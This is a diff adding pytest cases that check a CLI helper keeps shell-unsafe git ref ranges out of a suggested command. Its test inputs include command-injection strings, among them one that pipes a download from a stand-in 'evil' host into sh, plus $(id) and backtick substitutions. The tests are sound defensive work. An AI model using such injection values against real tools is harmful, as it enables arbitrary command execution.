@@ -116,6 +116,30 @@ def test_a_ref_with_no_checkout_here_says_how_to_get_the_brief(where, state, tmp
     assert "`gingugu xray brief --range main..feature/x`" in text
 
 
+@pytest.mark.parametrize(
+    "ref",
+    ["a..b;curl${IFS}evil|sh", "a..b`id`", "a..$(id)", "a..b&&x", "a..'b'", 'a.."b"', "a..b\\x"],
+)
+@pytest.mark.parametrize("named", ["", "acme/widget "])
+def test_a_ref_that_is_not_shell_safe_never_enters_the_suggested_command(
+    ref, named, state, tmp_path, monkeypatch
+):
+    """The range gate keeps git safe, not a shell: the note suggests a command to run."""
+    monkeypatch.setenv("MEMORY_XRAY_REPOS", "")
+    assert board_brief.ref_in(f"xray: {named}{ref}") == ref  # passes the git gate
+    text = board_brief.attach(f"xray: {named}{ref}", str(tmp_path), 4000)
+    assert text is not None and "\n" not in text
+    command = text.split("run `", 1)[1].split("`", 1)[0]
+    assert command == "gingugu xray brief --range <range>"
+    assert json.dumps(ref) in text  # still named, quoted
+
+
+@pytest.mark.parametrize("ref", ["main..feature/x", "HEAD~1..HEAD", "v1.2^..@{u}", "a...b"])
+def test_a_shell_safe_ref_is_named_in_the_command(ref, state, tmp_path):
+    text = board_brief.attach(f"xray: {ref}", str(tmp_path), 4000)
+    assert f"`gingugu xray brief --range {ref}`" in text
+
+
 # --- the prompt hook's board mail -----------------------------------------
 
 
